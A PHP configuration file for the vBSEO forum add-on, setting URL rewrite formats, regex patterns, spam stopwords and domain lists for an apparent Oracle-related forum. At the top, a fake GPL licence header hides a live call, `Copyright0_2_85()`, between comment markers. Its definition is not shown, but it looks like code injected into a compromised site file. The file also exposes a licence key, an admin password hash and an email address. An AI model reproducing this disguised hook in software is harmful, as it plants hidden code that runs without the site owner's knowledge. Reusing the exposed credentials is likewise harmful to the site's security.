<?PHP
/*			GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

GNU GENERAL PUBLIC LICENSE
Version 2, June 1991

*/Copyright0_2_85()/* 1989, 1991 Free Software Foundation, Inc.
                          675 Mass Ave, Cambridge, MA 02139, USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

Preamble

  The licenses for most software are designed to take away your
freedom to share and change it. By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users. This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it. (Some other Free Software Foundation software is covered by
the GNU Library General Public License instead.) You can apply it to
your programs, too.*/?>
<?php

/************************************************************************************
* vBSEO 3.3.2 for vBulletin v3.x.x by Crawlability, Inc.                            *
*                                                                                   *
* Copyright © 2005-2009, Crawlability, Inc. All rights reserved.                    *
* You may not redistribute this file or its derivatives without written permission. *
*                                                                                   *
* Sales Email: sales@crawlability.com                                               *
*                                                                                   *
*----------------------------vBSEO IS NOT FREE SOFTWARE-----------------------------*
* http://www.crawlability.com/vbseo/license/                                        *
************************************************************************************/



    /************************* CONFIGURATION STARTS HERE *******************************/


    /*---------------------------------------------------------------------------------*\
    | ********************* NOTE REGARDING vBSEO's CONFIGURATION ********************** |
    +-----------------------------------------------------------------------------------+
    | We highly recommend using the interface (www.yoursite.com/vB-root/vbseocp.php)    |          
    | to streamline the configuration process.                                          |
    |                                                                                   |
    | vBSEO's default URL settings should work fine with any installation. But feel     |
    | free to update your settigns and forum URL structure as you see fit.              |
    \*---------------------------------------------------------------------------------*/


    // ****** VBSEO LICENSE VALIDATION CODE ******
    define('VBSEO_LICENSE_CODE',            '558f62b553b38ba44822907b93570108');


    // ****** CONFIG PANEL PASSWORD ******
    define('VBSEO_ADMIN_PASSWORD',          'e057860a306f71ff0c421aa2d5eaaaae');

    
    // ****** CONFIG PANEL LANGUAGE ******
    define('VBSEO_CP_LANGUAGE',      'english');

    
    // ****** SAVE/RESTORE SETTINGS TO DB ******
    define('VBSEO_CONFIG_INIT',            '0');


    // ****** VBSEO (DE)ACTIVATION ******
    define('VBSEO_ENABLED',                  1);


    // ****** CONFIG PANEL LINK ******
    define('VBSEO_LINK',                     1);
    define('VBSEO_AFFILIATE_ID',            '387');


    // ****** PAGE NOT FOUND ******
    define('VBSEO_404_HANDLE',               0);
    define('VBSEO_404_CUSTOM',              '');

    
    // ****** REWRITE ARCHIVE ROOT ******
    define('VBSEO_ARCHIVE_ROOT',    '/sitemap/');

    // ****** INVERT ARCHIVE ORDER ******
    define('VBSEO_ARCHIVE_ORDER_DESC',       1);

    // ****** DEFINE SEPARATOR FOR URL PARTS ******
    define('VBSEO_SPACER',                 '-');

    // ****** CACHE SETTINGS ******
    define('VBSEO_CACHE_TYPE',               0);
    define('VBSEO_MEMCACHE_PERS',            0);
    define('VBSEO_MEMCACHE_TTL',          3600);
    define('VBSEO_MEMCACHE_TIMEOUT',         1);
    define('VBSEO_MEMCACHE_RETRY',          15);
    define('VBSEO_MEMCACHE_COMPRESS',    20000);
    define('VBSEO_MEMCACHE_HOSTS',          '');

    
    // ****** TURN REWRITES ON/OFF ******
    define('VBSEO_REWRITE_FORUM',            1);
    define('VBSEO_REWRITE_THREADS',          1);
    define('VBSEO_REWRITE_THREADS_ADDTITLE', 2);
    define('VBSEO_REWRITE_THREADS_ADDTITLE_POST', 1);
    define('VBSEO_REWRITE_ANNOUNCEMENT',     1);
    define('VBSEO_REWRITE_MEMBERS',          1);
    define('VBSEO_REWRITE_AVATAR',           1);
    define('VBSEO_REWRITE_MEMBER_LIST',      1);
    define('VBSEO_REWRITE_TREE_ICON',        1);
    define('VBSEO_REWRITE_POLLS',            1);
    define('VBSEO_REWRITE_ATTACHMENTS',      1);
    define('VBSEO_REWRITE_ATTACHMENTS_ALT',  1);
    define('VBSEO_REWRITE_ARCHIVE_URLS',     1);
    define('VBSEO_REDIRECT_ARCHIVE',         1);
    define('VBSEO_THREAD_301_REDIRECT',      1);
    define('VBSEO_REWRITE_PRINTTHREAD',      1);    
    define('VBSEO_REWRITE_SHOWPOST',         1);
    define('VBSEO_REWRITE_MALBUMS',          1);

    define('VBSEO_REWRITE_BLOGS',            1);
    define('VBSEO_REWRITE_BLOGS_ENT',        1);
    define('VBSEO_REWRITE_BLOGS_CAT',        1);
    define('VBSEO_REWRITE_BLOGS_ATT',        1);
    define('VBSEO_REWRITE_BLOGS_FEED',       1);
    define('VBSEO_REWRITE_BLOGS_LIST',       1);
    define('VBSEO_REWRITE_BLOGS_TAGS_ENTRY', 1);
	define('VBSEO_REWRITE_BLOGS_CUSTOM',     1);

    define('VBSEO_REWRITE_GROUPS',           1);
    define('VBSEO_REWRITE_TAGS',             1);

    define('VBSEO_REWRITE_EXT_ADDTITLE',     1);
    define('VBSEO_REWRITE_EXT_ADDTITLE_BLACKLIST', 'site.com|site1.com|site2.com|sitea.com|siteb.com|xxx.com|mysite.com|domain.com|mydomain.com|abc.com|123.com|forum1.com|forum2.com|myforum.com|sitename.com');
    define('VBSEO_EXT_PINGBACK',             1);
    define('VBSEO_EXT_TRACKBACK',            1);
    define('VBSEO_IN_PINGBACK',              1);
    define('VBSEO_IN_TRACKBACK',             1);
    define('VBSEO_POSTBIT_PINGBACK',         3);
    define('VBSEO_PERMALINK_PROFILE',        1);
    define('VBSEO_PERMALINK_ALBUM',          1);
    define('VBSEO_PERMALINK_BLOG',           1);
    define('VBSEO_PERMALINK_GROUPS',         1);
    define('VBSEO_PERMALINK_GROUPS_PIC',     1);
    define('VBSEO_PINGBACK_NOTIFY',          1);
    define('VBSEO_PINGBACK_NOTIFY_BCC',     'admin@otmfaq.com');
    define('VBSEO_PINGBACK_SERVICE',        'http://rpc.pingomatic.com|http://rpc.technorati.com/rpc/ping');
    define('VBSEO_PINGBACK_STOPWORDS',      'cialis|valium|xenical|phentermine|xanax|alprazolam|tramadol|diazepam|levitra|ambien|soma|prozac|meridia|viagra|propecia|vicodin|fioricet|ultram|didrex|ringtones|nexium|adipex|free|allegra|carisoprodol|swinger|amateur|sex|asian|porn|hydrocodone|prescription|ativan|paxil|xoomer|gambling|poker|celebrex|codeine|lexapro');
    define('VBSEO_IN_REFBACK',               1);
    define('VBSEO_LINKBACK_IGNOREDUPE',      0);
    define('VBSEO_LINKBACK_SHOWHITS_UG',    '');
	define('VBSEO_LINKBACK_BLACKLIST',    '');
    define('VBSEO_REFBACK_BLACKLIST',      'google\..+/(u/|search|blogsearch|custom|pda|linux|ie|ig)|search\.yahoo\.|search\.msn\.|msncache\.com|altavista\.com|answers\.com|ask\.|search\.lycos\.|dogpile\.|alltheinternet\.com|tiscali\.|baidu\.|verden\.abcsok\.no|[/&\?=\.](search|arama|blogsearch|query|results|sok|srch|yandsearch|aolsearch|q)[^a-z-]|backlink_checker\.php|extremetracking\.com|www\.kvasir\.no/nettsok/searchResult|awstats\.pl\?|translate\.google\.com|suchen\.(pl|php|aspx)\?|mail\.yahoo\.com|mail\.live\.com|squirrelmail\/src\/');
    define('VBSEO_TWEETBOARD',               0);
    define('VBSEO_TWEETBOARD_USER',          '');
    

    // Set this variable to 1 to include special characters using url encoding for member profiles.
    define('VBSEO_REWRITE_MEMBER_MORECHARS', 0);


    // Set this variable to 1 to replace external links in forums (as defined in the admincp) with direct
    // links instead of redirections (default vB functionality)
    define('VBSEO_FORUMLINK_DIRECT',         1);


    // Enable this option to redirect all external links posted in private forums through an internal script. This
    // will hide URLs from your private forums in server logs on external sites, thus protecting your privacy.
    define('VBSEO_REDIRECT_PRIV_EXTERNAL',   1);


    // ****** DEFINE URL PARTS MAXIMUM LENGTH ******
    define('VBSEO_URL_PART_MAX',             0);


    // ****** DEFINE FORUM TITLE BITS ******
    define('VBSEO_FORUM_TITLE_BIT',             'f%forum_id%');


    // ****** DEFINE URL FORMATS ******
    define('VBSEO_URL_THREAD',                  'f%forum_id%/%thread_title%-%thread_id%/');
    define('VBSEO_URL_THREAD_LASTPOST',         'f%forum_id%/%thread_title%-%thread_id%-last/');
    define('VBSEO_URL_THREAD_NEWPOST',          'f%forum_id%/%thread_title%-%thread_id%-new/');
    define('VBSEO_URL_THREAD_GOTOPOST',         'f%forum_id%/%thread_title%-%thread_id%-post%post_id%/');
    define('VBSEO_URL_THREAD_GOTOPOST_PAGENUM', 'f%forum_id%/%thread_title%-%thread_id%-%thread_page%-post%post_id%/');
    
    define('VBSEO_URL_THREAD_PREV',             'f%forum_id%/%thread_title%-%thread_id%-prev/');
    define('VBSEO_URL_THREAD_NEXT',             'f%forum_id%/%thread_title%-%thread_id%-next/');
    define('VBSEO_URL_THREAD_PREV_DIRECT',      1);
    define('VBSEO_URL_THREAD_NEXT_DIRECT',      1);

    define('VBSEO_URL_THREAD_PRINT',            'f%forum_id%/%thread_title%-%thread_id%-print/');
    define('VBSEO_URL_THREAD_PRINT_PAGENUM',    'f%forum_id%/%thread_title%-%thread_id%-print/index%thread_page%.html');
    define('VBSEO_URL_POST_SHOW',               '%post_id%-post%post_count%.html');

    define('VBSEO_URL_THREAD_PAGENUM',          'f%forum_id%/%thread_title%-%thread_id%/index%thread_page%.html');
    define('VBSEO_URL_THREAD_GARS_PAGENUM',     '');
    define('VBSEO_URL_POLL',                    'f%forum_id%/poll-%poll_id%-%poll_title%.html');
    define('VBSEO_URL_FORUM',                   'f%forum_id%/');
    define('VBSEO_URL_FORUM_PAGENUM',           'f%forum_id%/index%forum_page%.html');
    define('VBSEO_URL_FORUM_ANNOUNCEMENT',      'f%forum_id%/announcement-%announcement_title%.html');
    define('VBSEO_URL_FORUM_ANNOUNCEMENT_ALL',  'f%forum_id%/announcements.html');
    define('VBSEO_URL_MEMBER',                  'members/%user_name%/');
    define('VBSEO_URL_MEMBER_MSGPAGE',          'members/%user_name%-page%page%.html');
    define('VBSEO_URL_MEMBER_CONV',             'members/%user_name%-with-%visitor_name%.html');
    define('VBSEO_URL_MEMBER_CONVPAGE',         'members/%user_name%-with-%visitor_name%-page%page%.html');
    define('VBSEO_URL_MEMBER_FRIENDSPAGE',      'members/%user_name%-friends-page%page%.html');
    define('VBSEO_URL_MEMBER_ALBUMS',           'members/%user_name%-albums.html');
    define('VBSEO_URL_MEMBER_ALBUMS_PAGE',      'members/%user_name%-albums-page%page%.html');
    define('VBSEO_URL_MEMBER_ALBUM',            'members/%user_name%-albums-%album_title%.html');
	define('VBSEO_URL_MEMBER_ALBUM_HOME',       'members/albums.html');
	define('VBSEO_URL_MEMBER_ALBUM_HOME_PAGE',  'members/albums-%page%.html');
    define('VBSEO_URL_MEMBER_ALBUM_PAGE',       'members/%user_name%-albums-%album_title%-page%page%.html');
    define('VBSEO_URL_MEMBER_PICTURE',          'members/%user_name%-albums-%album_title%-picture%picture_id%-%picture_title%.html');
    define('VBSEO_URL_MEMBER_PICTURE_PAGE',     'members/%user_name%-albums-%album_title%-picture%picture_id%-%picture_title%-page%page%.html');
    define('VBSEO_URL_MEMBER_PICTURE_IMG',      'members/%user_name%-albums-%album_title%-picture%picture_id%-%picture_title%.%original_ext%');

    define('VBSEO_URL_MEMBERLIST',              'members/list/');
    define('VBSEO_URL_MEMBERLIST_PAGENUM',      'members/list/index%page%.html');
    define('VBSEO_URL_MEMBERLIST_LETTER',       'members/list/%letter%%page%.html');

    define('VBSEO_URL_AVATAR',                  '%user_name%.gif');
    define('VBSEO_URL_THREAD_TREE_ICON',        'f%forum_id%/%thread_title%.gif');
    define('VBSEO_URL_FORUM_TREE_ICON',         '%forum_title%.gif');
    define('VBSEO_URL_ATTACHMENT',              'f%forum_id%/%attachment_id%-%thread_title%-%original_filename%');
    define('VBSEO_URL_ATTACHMENT_ALT',          '%thread_title%-%original_filename%');

    define('VBSEO_URL_BLOG_HOME',               'blogs/');
    define('VBSEO_URL_BLOG_ENTRY',              'blogs/%user_name%/%blog_id%-%blog_title%.html');
    define('VBSEO_URL_BLOG_ENTRY_PAGE',         'blogs/%user_name%/%blog_id%-%blog_title%-page%page%.html');
    define('VBSEO_URL_BLOG_ENTRY_REDIR',        'blogs/comments/comment%comment_id%.html');
    define('VBSEO_URL_BLOG_USER',               'blogs/%user_name%/');
    define('VBSEO_URL_BLOG_USER_PAGE',          'blogs/%user_name%/index%page%.html');
    define('VBSEO_URL_BLOG_GLOB_CAT',           'blogs/categories/%category_title%/');
    define('VBSEO_URL_BLOG_GLOB_CAT_PAGE',      'blogs/categories/%category_title%/index%page%.html');
    define('VBSEO_URL_BLOG_CAT',                'blogs/%user_name%/%category_title%/');
    define('VBSEO_URL_BLOG_CAT_PAGE',           'blogs/%user_name%/%category_title%/index%page%.html');
    define('VBSEO_URL_BLOG_LIST',               'blogs/recent-entries/');
    define('VBSEO_URL_BLOG_LIST_PAGE',          'blogs/recent-entries/index%page%.html');
    define('VBSEO_URL_BLOG_BLIST',              'blogs/all/');
    define('VBSEO_URL_BLOG_BLIST_PAGE',         'blogs/all/index%page%.html');
    define('VBSEO_URL_BLOG_NEXT',               'blogs/%user_name%/%blog_id%-%blog_title%-next.html');
    define('VBSEO_URL_BLOG_PREV',               'blogs/%user_name%/%blog_id%-%blog_title%-prev.html');
    define('VBSEO_URL_BLOG_FEED',               'blogs/feed.rss');
    define('VBSEO_URL_BLOG_FEEDUSER',           'blogs/%user_name%/feed.rss');
    define('VBSEO_URL_BLOG_CUSTOM',	            'blogs/%user_name%/custom%page_id%-%page_title%.html');
    define('VBSEO_URL_BLOG_TAGS_HOME',          'blogs/tags/');
    define('VBSEO_URL_BLOG_TAGS_ENTRY',         'blogs/tags/%tag%.html');
    define('VBSEO_URL_BLOG_TAGS_ENTRY_PAGE',    'blogs/tags/%tag%-page%page%.html');
    
    define('VBSEO_URL_BLOG_MONTH',              'blogs/%year%/%month%/');
    define('VBSEO_URL_BLOG_DAY',                'blogs/%year%/%month%/%day%.html');
    define('VBSEO_URL_BLOG_MONTH_PAGE',         'blogs/%year%/%month%/index%page%.html');
    define('VBSEO_URL_BLOG_DAY_PAGE',           'blogs/%year%/%month%/%day%/index%page%.html');
    define('VBSEO_URL_BLOG_UMONTH',             'blogs/%user_name%/%year%/%month%/');
    define('VBSEO_URL_BLOG_UDAY',               'blogs/%user_name%/%year%/%month%/%day%.html');
    define('VBSEO_URL_BLOG_ATT',                'blogs/%user_name%/attachments/%attachment_id%-%blog_title%-%original_filename%');
    define('VBSEO_URL_BLOG_BEST_ENT',           'blogs/best-entries/');
    define('VBSEO_URL_BLOG_BEST_ENT_PAGE',      'blogs/best-entries/index%page%.html');
    define('VBSEO_URL_BLOG_BEST_BLOGS',         'blogs/best-blogs/');
    define('VBSEO_URL_BLOG_BEST_BLOGS_PAGE',    'blogs/best-blogs/index%page%.html');
    define('VBSEO_URL_BLOG_LAST_ENT',			'blogs/latest-entries/');
    define('VBSEO_URL_BLOG_LAST_ENT_PAGE',		'blogs/latest-entries/index%page%.html');

    define('VBSEO_URL_BLOG_CLIST',              'blogs/comments/');
    define('VBSEO_URL_BLOG_CLIST_PAGE',         'blogs/comments/index%page%.html');

    define('VBSEO_URL_GROUPS_HOME',             'groups/');
    define('VBSEO_URL_GROUPS_ALL',              'groups/all.html');
    define('VBSEO_URL_GROUPS_ALL_PAGE',         'groups/all-%page%.html');
    define('VBSEO_URL_GROUPS',              	'groups/%group_name%.html');
    define('VBSEO_URL_GROUPS_PAGE',             'groups/%group_name%-page%page%.html');
    define('VBSEO_URL_GROUPS_MEMBERS',          'groups/%group_name%-members.html');
    define('VBSEO_URL_GROUPS_MEMBERS_PAGE',     'groups/%group_name%/members-page%page%.html');
    define('VBSEO_URL_GROUPS_PIC',              'groups/%group_name%-pictures.html');
    define('VBSEO_URL_GROUPS_PIC_PAGE',         'groups/%group_name%-pictures-page%page%.html');
    define('VBSEO_URL_GROUPS_PICTURE',          'groups/%group_name%-picture%picture_id%-%picture_title%.html');
    define('VBSEO_URL_GROUPS_PICTURE_PAGE',     'groups/%group_name%-picture%picture_id%-%picture_title%-page%page%.html');
    define('VBSEO_URL_GROUPS_PICTURE_IMG',      'groups/%group_name%-picture%picture_id%-%picture_title%.%original_ext%');

    define('VBSEO_URL_GROUPS_CATEGORY',         'groups/category-%cat_name%.html');
	define('VBSEO_URL_GROUPS_CATEGORY_PAGE',    'groups/category-%cat_name%-page%page%.html');
    define('VBSEO_URL_GROUPS_CATEGORY_LIST',    'groups/categories.html');
    define('VBSEO_URL_GROUPS_CATEGORY_LIST_PAGE','groups/categories-page%page%.html');
    define('VBSEO_URL_GROUPS_DISCUSSION',       'groups/%group_name%-d%discussion_id%-%discussion_name%.html');
    define('VBSEO_URL_GROUPS_DISCUSSION_PAGE',  'groups/%group_name%-d%discussion_id%-%discussion_name%-page%page%.html');
	define('VBSEO_URL_GROUPS_DISCUSSION_LAST_POST',  'groups/%group_name%-d%discussion_id%-%discussion_name%-last-post.html');

    define('VBSEO_URL_TAGS_HOME',               'tags/');
    define('VBSEO_URL_TAGS_ENTRY',              'tags/%tag%.html');
    define('VBSEO_URL_TAGS_ENTRYPAGE',          'tags/%tag%-page%page%.html');

    $vbseo_url_formats = array('VBSEO_FORUM_TITLE_BIT' => 'f(\d+)',
'VBSEO_URL_FORUM' => 'f(\d+)/',
'VBSEO_URL_FORUM_PAGENUM' => 'f(\d+)/index(\d+)\.html',
'VBSEO_URL_THREAD' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)/',
'VBSEO_URL_THREAD_PAGENUM' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)/index(\d+)\.html',
'VBSEO_URL_THREAD_LASTPOST' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-last/',
'VBSEO_URL_THREAD_NEWPOST' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-new/',
'VBSEO_URL_THREAD_GOTOPOST' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-post(\d+)/',
'VBSEO_URL_THREAD_GOTOPOST_PAGENUM' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-(\d+)-post(\d+)/',
'VBSEO_URL_THREAD_PREV' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-prev/',
'VBSEO_URL_THREAD_NEXT' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-next/',
'VBSEO_URL_POLL' => 'f(\d+)/poll-(\d+)-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_FORUM_ANNOUNCEMENT' => 'f(\d+)/announcement-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_FORUM_ANNOUNCEMENT_ALL' => 'f(\d+)/announcements\.html',
'VBSEO_URL_MEMBER' => 'members/([^/]+)/',
'VBSEO_URL_MEMBER_MSGPAGE' => 'members/([^/]+)-page(\d+)\.html',
'VBSEO_URL_MEMBER_CONV' => 'members/([^/]+)-with-([^/]+)\.html',
'VBSEO_URL_MEMBER_CONVPAGE' => 'members/([^/]+)-with-([^/]+)-page(\d+)\.html',
'VBSEO_URL_MEMBER_FRIENDSPAGE' => 'members/([^/]+)-friends-page(\d+)\.html',
'VBSEO_URL_MEMBER_ALBUM_HOME' => 'members/albums\.html',
'VBSEO_URL_MEMBER_ALBUM_HOME_PAGE' => 'members/albums-(\d+)\.html',
'VBSEO_URL_MEMBER_ALBUMS' => 'members/([^/]+)-albums\.html',
'VBSEO_URL_MEMBER_ALBUMS_PAGE' => 'members/([^/]+)-albums-page(\d+)\.html',
'VBSEO_URL_MEMBER_ALBUM' => 'members/([^/]+)-albums-([^/]+)\.html',
'VBSEO_URL_MEMBER_ALBUM_PAGE' => 'members/([^/]+)-albums-([^/]+)-page(\d+)\.html',
'VBSEO_URL_MEMBER_PICTURE' => 'members/([^/]+)-albums-([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_MEMBER_PICTURE_PAGE' => 'members/([^/]+)-albums-([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)-page(\d+)\.html',
'VBSEO_URL_MEMBER_PICTURE_IMG' => 'members/([^/]+)-albums-([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)\.([^/]+)',
'VBSEO_URL_MEMBERLIST' => 'members/list/',
'VBSEO_URL_MEMBERLIST_PAGENUM' => 'members/list/index(\d+)\.html',
'VBSEO_URL_MEMBERLIST_LETTER' => 'members/list/([a-z]|0|all)(\d+)\.html',
'VBSEO_URL_AVATAR' => '([^/]+)\.gif',
'VBSEO_URL_FORUM_TREE_ICON' => '([a-z\._A-Z\d-]+)\.gif',
'VBSEO_URL_THREAD_TREE_ICON' => 'f(\d+)/([a-z\._A-Z\d-]+)\.gif',
'VBSEO_URL_ATTACHMENT' => 'f(\d+)/([dt\d]+)-([a-z\._A-Z\d-]+)-(.+)',
'VBSEO_URL_ATTACHMENT_ALT' => '([a-z\._A-Z\d-]+)-(.+)',
'VBSEO_URL_THREAD_PRINT' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-print/',
'VBSEO_URL_THREAD_PRINT_PAGENUM' => 'f(\d+)/([a-z\._A-Z\d-]+)-(\d+)-print/index(\d+)\.html',
'VBSEO_URL_POST_SHOW' => '(\d+)-post(\d*?)\.html',
'VBSEO_ARCHIVE_ROOT' => '/sitemap/',
'VBSEO_URL_BLOG_HOME' => 'blogs/',
'VBSEO_URL_BLOG_ENTRY' => 'blogs/([^/]+)/(\d+)-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_BLOG_ENTRY_PAGE' => 'blogs/([^/]+)/(\d+)-([a-z\._A-Z\d-]+)-page(\d+)\.html',
'VBSEO_URL_BLOG_ENTRY_REDIR' => 'blogs/comments/comment(\d+)\.html',
'VBSEO_URL_BLOG_USER' => 'blogs/([^/]+)/',
'VBSEO_URL_BLOG_USER_PAGE' => 'blogs/([^/]+)/index(\d+)\.html',
'VBSEO_URL_BLOG_CAT' => 'blogs/([^/]+)/([a-z\._A-Z\d-]+)/',
'VBSEO_URL_BLOG_GLOB_CAT' => 'blogs/categories/([a-z\._A-Z\d-]+)/',
'VBSEO_URL_BLOG_GLOB_CAT_PAGE' => 'blogs/categories/([a-z\._A-Z\d-]+)/index(\d+)\.html',
'VBSEO_URL_BLOG_CAT_PAGE' => 'blogs/([^/]+)/([a-z\._A-Z\d-]+)/index(\d+)\.html',
'VBSEO_URL_BLOG_LIST' => 'blogs/recent-entries/',
'VBSEO_URL_BLOG_LIST_PAGE' => 'blogs/recent-entries/index(\d+)\.html',
'VBSEO_URL_BLOG_BLIST' => 'blogs/all/',
'VBSEO_URL_BLOG_BLIST_PAGE' => 'blogs/all/index(\d+)\.html',
'VBSEO_URL_BLOG_NEXT' => 'blogs/([^/]+)/(\d+)-([a-z\._A-Z\d-]+)-next\.html',
'VBSEO_URL_BLOG_PREV' => 'blogs/([^/]+)/(\d+)-([a-z\._A-Z\d-]+)-prev\.html',
'VBSEO_URL_BLOG_FEED' => 'blogs/feed\.rss',
'VBSEO_URL_BLOG_FEEDUSER' => 'blogs/([^/]+)/feed\.rss',
'VBSEO_URL_BLOG_MONTH' => 'blogs/(\d+)/(\d+)/',
'VBSEO_URL_BLOG_DAY' => 'blogs/(\d+)/(\d+)/(\d+)\.html',
'VBSEO_URL_BLOG_MONTH_PAGE' => 'blogs/(\d+)/(\d+)/index(\d+)\.html',
'VBSEO_URL_BLOG_DAY_PAGE' => 'blogs/(\d+)/(\d+)/(\d+)/index(\d+)\.html',
'VBSEO_URL_BLOG_UMONTH' => 'blogs/([^/]+)/(\d+)/(\d+)/',
'VBSEO_URL_BLOG_UDAY' => 'blogs/([^/]+)/(\d+)/(\d+)/(\d+)\.html',
'VBSEO_URL_BLOG_ATT' => 'blogs/([^/]+)/attachments/([dt\d]+)-([a-z\._A-Z\d-]+)-(.+)',
'VBSEO_URL_BLOG_LAST_ENT' => 'blogs/latest-entries/',
'VBSEO_URL_BLOG_LAST_ENT_PAGE' => 'blogs/latest-entries/index(\d+)\.html',
'VBSEO_URL_BLOG_TAGS_HOME' => 'blogs/tags/',
'VBSEO_URL_BLOG_TAGS_ENTRY' => 'blogs/tags/(.+)\.html',
'VBSEO_URL_BLOG_TAGS_ENTRY_PAGE' => 'blogs/tags/(.+)-page(\d+)\.html',
'VBSEO_URL_BLOG_CUSTOM' => 'blogs/([^/]+)/custom(\d+)-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_BLOG_BEST_ENT' => 'blogs/best-entries/',
'VBSEO_URL_BLOG_BEST_BLOGS' => 'blogs/best-blogs/',
'VBSEO_URL_BLOG_BEST_ENT_PAGE' => 'blogs/best-entries/index(\d+)\.html',
'VBSEO_URL_BLOG_BEST_BLOGS_PAGE' => 'blogs/best-blogs/index(\d+)\.html',
'VBSEO_URL_BLOG_CLIST' => 'blogs/comments/',
'VBSEO_URL_BLOG_CLIST_PAGE' => 'blogs/comments/index(\d+)\.html',
'VBSEO_URL_GROUPS_HOME' => 'groups/',
'VBSEO_URL_GROUPS_ALL' => 'groups/all\.html',
'VBSEO_URL_GROUPS_ALL_PAGE' => 'groups/all-(\d+)\.html',
'VBSEO_URL_GROUPS' => 'groups/([^/]+)\.html',
'VBSEO_URL_GROUPS_PAGE' => 'groups/([^/]+)-page(\d+)\.html',
'VBSEO_URL_GROUPS_MEMBERS' => 'groups/([^/]+)-members\.html',
'VBSEO_URL_GROUPS_MEMBERS_PAGE' => 'groups/([^/]+)/members-page(\d+)\.html',
'VBSEO_URL_GROUPS_PIC' => 'groups/([^/]+)-pictures\.html',
'VBSEO_URL_GROUPS_PIC_PAGE' => 'groups/([^/]+)-pictures-page(\d+)\.html',
'VBSEO_URL_GROUPS_PICTURE' => 'groups/([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)\.html',
'VBSEO_URL_GROUPS_PICTURE_PAGE' => 'groups/([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)-page(\d+)\.html',
'VBSEO_URL_GROUPS_PICTURE_IMG' => 'groups/([^/]+)-picture([dt\d]+)-([a-z\._A-Z\d-]+)\.([^/]+)',
'VBSEO_URL_GROUPS_CATEGORY' => 'groups/category-([^/]+)\.html',
'VBSEO_URL_GROUPS_CATEGORY_PAGE' => 'groups/category-([^/]+)-page(\d+)\.html',
'VBSEO_URL_GROUPS_CATEGORY_LIST' => 'groups/categories\.html',
'VBSEO_URL_GROUPS_CATEGORY_LIST_PAGE' => 'groups/categories-page(\d+)\.html',
'VBSEO_URL_GROUPS_DISCUSSION' => 'groups/([^/]+)-d(\d+)-([^/]+)\.html',
'VBSEO_URL_GROUPS_DISCUSSION_PAGE' => 'groups/([^/]+)-d(\d+)-([^/]+)-page(\d+)\.html',
'VBSEO_URL_GROUPS_DISCUSSION_LAST_POST' => 'groups/([^/]+)-d(\d+)-([^/]+)-last-post\.html',
'VBSEO_URL_TAGS_HOME' => 'tags/',
'VBSEO_URL_TAGS_ENTRY' => 'tags/(.+)\.html',
'VBSEO_URL_TAGS_ENTRYPAGE' => 'tags/(.+)-page(\d+)\.html');


    // ****** REMOVE STOP WORDS FROM URLs ******
    define('VBSEO_FILTER_STOPWORDS',              1);
    define('VBSEO_KEEP_STOPWORDS_SHORT',          0);

    define('VBSEO_DOMAINS_WHITELIST',            'mavenwire.com|mavenwire.co.uk|blog.mavenwire.com|forums.mavenwire.com|2tondesigns.com|2tonauctions.com|openbooksolutions.com|xnewmex.com|eiisolutions.net|otmfaq.com');
    define('VBSEO_DOMAINS_BLACKLIST',            'cpco.biz|cuartero.net|cognigent.co.uk|satyam.com|ibsplc.com|ksaptech.com|darc.com|collaborativeconsulting.com|egiusa.com|luciditycg.com|oracle.com|PacificCrestTechnology.com|rcmt.com|soltre.com|ibm.com|deloitte.com|accenture.com|navigantconsulting.com|arthurandersen.com|hitachiconsulting.com|capgemini.com|google.com|yahoo.com|msn.com|dazsi.com|manh.com|clearpathgroup.com|tcs.com|bearingpoint.com|koreone.com|unifysolutions.com|terillium.com|dcti-us.com|kinesium.com|m9solutions.com|csc.com|tusc.com|wipro.com|hcltech.com|fujitsu.com|primus-solutions.de');
    define('VBSEO_IGNOREPAGES',                  '');

    
    // ****** REMOVE NON-ENGLISH CHARSET FROM URLs? ******
    define('VBSEO_FILTER_FOREIGNCHARS',           1);

    
    // ****** INCLUDE DOMAIN NAME IN URLs? ******   
    define('VBSEO_USE_HOSTNAME_IN_URL',           1);


    // ****** INCLUDE ABSOLUTE PATH IN URLs? ****** 
    define('VBSEO_ABSOLUTE_PATH_IN_URL',          1);


    // ****** ADD REL="NOFOLLOW" TO LINKS ******    
    define('VBSEO_NOFOLLOW_SHOWPOST',             2);
    define('VBSEO_NOFOLLOW_PRINTTHREAD',          1);
    define('VBSEO_NOFOLLOW_SORT',                 1);
    define('VBSEO_NOFOLLOW_DYNA',                 1);
    define('VBSEO_NOFOLLOW_EXTERNAL',             1);
    define('VBSEO_NOFOLLOW_MEMBER_POSTBIT',       1);
    define('VBSEO_NOFOLLOW_MEMBER_FORUMHOME',     1);


    // ****** Canolical Link Display  ******    
    define('VBSEO_CANONIC_LINK_TAG',       1);
    
    // ****** VIRTUAL HTML DISPLAY  ******    
    define('VBSEO_VIRTUAL_HTML',                  1);

    
    // ****** DEFINE ACRONYM EXPANSION REPLACEMENTS ******  
    $seo_replacements = array('seo' => 'Search Engine Optimization',
'pr' => 'Page Ranking',
);

